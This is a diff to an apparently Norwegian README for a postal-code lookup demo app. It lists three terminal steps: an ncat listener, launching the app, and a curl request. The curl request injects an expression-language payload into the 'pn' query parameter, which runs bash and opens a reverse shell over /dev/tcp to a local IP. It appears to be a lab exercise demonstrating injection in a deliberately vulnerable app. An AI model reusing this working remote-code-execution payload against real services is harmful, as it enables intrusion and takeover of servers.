@@ -36,7 +36,7 @@ Resultatet er en liste av poststeder som matcher søkekriteriene:
 Tre terminaler:
 1. `ncat -lkvp 31338`
 2. `mvn clean package exec:java`
-3. `curl -vv -G --data-urlencode 'name=${"".getClass().forName("java.lang.Runtime").getMethod("getRuntime").invoke(null).exec(["bash", "-c", "exec 5<>/dev/tcp/192.168.10.138/31338;cat <&5 | while read line; do $line 2>&5 >&5;done"].toArray("".split(","))).waitFor()}' http://localhost:8080/postnr`
+3. `curl -vv -G --data-urlencode 'pn=${"".getClass().forName("java.lang.Runtime").getMethod("getRuntime").invoke(null).exec(["bash", "-c", "exec 5<>/dev/tcp/192.168.10.138/31338;cat <&5 | while read line; do $line 2>&5 >&5;done"].toArray("".split(","))).waitFor()}' http://localhost:8080/postnr`
 
 Merk at IP-adressen i terminal 3 må matche IP-adressen til lokal maskin.
 
